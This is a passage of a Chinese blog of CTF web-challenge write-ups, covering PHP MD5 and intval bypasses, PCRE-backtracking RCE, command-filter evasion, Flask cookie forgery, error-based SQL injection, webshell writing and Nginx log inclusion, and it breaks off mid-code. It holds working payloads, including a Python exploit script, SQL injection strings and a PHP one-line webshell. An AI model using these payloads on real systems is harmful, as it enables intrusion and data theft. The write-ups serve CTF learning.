<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%A5%87%E5%A6%99%E7%9A%84MD5%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>直接数组绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>

<p>得到下一步源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123;</span><br><span class="line">    echo $FLAG;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是数组绕过，直接就得到了flag。</p>
<h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>json_encode:接受一个 JSON 格式的字符串并且把它转换为 PHP 变量,如果是true则返回array并非object，checkdata检测绕过，手段</p>
<p> &#x2F;^.<em>([\w]|^|*|(|~|`|?|/| |||&amp;|!|&lt;|&gt;|{|\x09|\x0a|[).</em>$&#x2F;m  .*有好几个，这里采用回溯绕过</p>
<p>关于回溯绕过，这里参考下面这篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/190794.html">PHP利用PCRE回溯次数限制绕过某些安全限制 - FreeBuf网络安全行业门户</a></p>
<p>主要就是回溯次数大于1000000会返回false进行绕过</p>
<ul>
<li><p>系统命令执行用反引号 &#96;，因为别的过滤掉了</p>
</li>
<li><p>eval里面用<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107#toc-7">短标签 ?&gt;</a> 来绕过过滤echo，无法输出的情况</p>
<p>使用脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://1.14.71.254:28288/&#x27;</span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;,&quot;+&quot;:&quot;&#x27; + &quot;-&quot; * 1000000 + &#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(url=url, data=&#123;&quot;letter&quot;: payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></li>
</ul>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dmiddlerce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<h2 id="WUSTCTF-2020-朴实无华"><a href="#WUSTCTF-2020-朴实无华" class="headerlink" title="[WUSTCTF 2020]朴实无华"></a>[WUSTCTF 2020]朴实无华</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>界面什么都没有，f12也没什么有用的，尝试访问robots.txt</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现可以文件，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>得到假的flag，拉进火狐看看请求头里有没有什么东西</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>在响应头里看见了一个自定义的头，里面还有一个可疑文件，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>拿到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到有三层过滤：</p>
<p>第一层：</p>
<p>传入一个参数num,经过intval函数既要小于2020并且加一要大于2021，看一下这个函数<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。<br>我们尝试传入：num&#x3D;2e4</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<p>发现成功绕过，现在开始第二层：</p>
<p>就是传进去的值要与他md5加密之后的值一样</p>
<p>直接传值：md5&#x3D;0e215962017</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png" class>

<p>成功绕过，现在看最后一层：</p>
<p>传入的get_flag不能有空格<br>传入的cat会被替换为wctf2020<br>传入的get_flag会当作系统命令被执行<br>我们直接ls看一看有什么</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE7.png" class>

<p>怀疑flag就在最长的那玩意儿里面，既然不准用cat ，那就用有相同功能的tac ，空格就用$IFS$9绕过就行</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE8.png" class>

<p>拿到flag</p>
<h2 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h2><p>这道题一进去让我们随便输来验证身份，我们随便输入一个数字，他告诉我们只有管理员才能拿到flag，所以我们尝试回到输入身份的地方并输入admin，但是告诉我们你怎么可能是管理员，并且标签提示我们是cookie伪造，尝试进行查看</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现cookie，使用flask_session进行cookie伪造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s &quot;secret_key&quot; -c &quot;需要解密的session值&quot;</span><br></pre></td></tr></table></figure>

<p>但是我们并不知道secret_key是啥，只能猜测是比赛名称LitCTF</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>解得cookie值，现在我们使用命令在flask_session里对其进行修改并加密</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>得到对于管理员来讲的加密之后的cookie值</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>成功拿到flag</p>
<h2 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h2><p>页面一进去发现有很多可点击的地方，先点击登录</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>感觉这个登录框很有注入点的感觉，手测加fuzz一下，这里发现，fuzz测出来or是可以用的，但是手测却又不可以，上网查一下才发现是后端进行了过滤，但是有点不知道该怎么办了，看了一下wp，才想起来可以用||管道符（太久没做，生疏了）</p>
<p>剩下的也没什么过滤了的，就是比较基础的报错注入语句进行查询了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e,(select group_concat(table_name) from mysql.innodb_table_stats),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>返回里面得到了表名，FLAG_TABLE肯定最可疑，但是我们查询之后里面并没有，并且这里表名并没有显示完全，使用mid函数截断拼接，发现剩下的表名，这里就不写其中的步骤了，直接查询output</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e, (select * from (select * from output a join output )b),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>得到字段名data，直接查询flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e,(select data from output),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>这里flag并没有显示完全，和刚刚查表名一样使用mid函数截断看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27; ||extractvalue(1,concat(0x7e,mid((select data from output),20),0x7e)) #</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>得到后半段flag，拼接即可</p>
<h2 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h2><p>页面一进去是一个怎么都回答不了的10+10，尝试F12获取更多信息，发现没有反应，使用开发者工具打开看看</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现有一个js文件，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>以为直接拿到了flag，高兴坏了，提交显示错误，解码一下flag其中的内容，发现是一个文件名：NsScTf.php，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>这里就涉及到一个小知识点：</p>
<p>使用类名::方法名，来访问其中方法，并且我们发现没有过滤大写，所以进行读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=Nss2::Ctf</span><br></pre></td></tr></table></figure>

<p>F12得到flag。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<h2 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>这道无字母RCE看样子只能使用自增了，异或和取反都被禁用</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">(6条消息) 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_无数字正则匹配绕过取反脚本_yu22x的博客-CSDN博客</a></p>
<p>使用yu神的自增脚本，使用之前记得url编码一下</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>ctrl+f查找一下，发现flag那一栏没有值，再查一下disable_function，发现很多常用的函数都被禁用了</p>
<p>但是我们发现file_put_contents函数并没有被禁，所以使用这个函数进行木马文件的写入（注意由于空格被禁了，所以使用%20进行代替）$前面加上了\是防止其被字符串包裹无法发挥作用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php%20eval(\$_POST[&#x27;1&#x27;]);%20?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接并访问，在网站根目录下找到flag。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h2 id="HNCTF-2022-WEEK2-easy-include"><a href="#HNCTF-2022-WEEK2-easy-include" class="headerlink" title="[HNCTF 2022 WEEK2]easy_include"></a>[HNCTF 2022 WEEK2]easy_include</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>可以看到题目作为一个文件包含过滤了很多字符，并且标签提醒是一个Nginx，我们尝试一下请求包里UA上传一句话木马，并在日志文件访问，上网搜到Nginx的日志文件路径是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log </p>
<p>我们抓包进行尝试</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>可以看到这样做成功得到了回显，那么尝试cat &#x2F;ffflllaaaggg</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>可以看到就成功拿到flag，这道题操作很简单，但是我之前一直听他们说日志文件包含但没做过类似题目，这次遇到就写上去了</p>
<h2 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 